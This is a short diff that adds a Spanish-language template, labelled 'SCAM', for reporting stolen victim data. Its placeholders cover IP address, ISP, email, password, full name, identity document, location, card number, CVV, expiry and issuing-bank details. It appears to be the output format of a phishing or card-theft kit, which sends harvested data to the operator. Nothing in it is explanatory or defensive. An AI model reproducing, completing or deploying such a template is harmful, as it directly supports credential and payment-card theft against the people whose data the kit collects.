@@ -1,0 +1,28 @@
+🔥 SCAM 🔥
+
+👉🏻 Datos de conexión 👈🏻
+⚡️ IP: {1}
+⚡️ ISP: {2}
+
+👉🏻 Datos personales 👈🏻
+⚡️ Email: {3}
+⚡️ Contraseña: {4}
+⚡️ Nombre: {5}
+⚡️ Documento: {6}
+⚡️ Ciudad: {7}
+⚡️ Provincia: {8}
+
+👉🏻 Tarjeta 👈🏻
+⚡️ Tarjeta: {9}
+⚡️ CVV: {10}
+⚡️ Vencimiento: {11}
+
+👉🏻 Datos de tarjeta 👈🏻
+⚡️ Tipo: {12}
+⚡️ Marca: {13}
+⚡️ Esquema: {14}
+⚡️ Pais: {15}
+⚡️ Banco: {16}
+⚡️ Url: {17}
+⚡️ Telefono: {18}
+⚡️ Ciudad: {19}
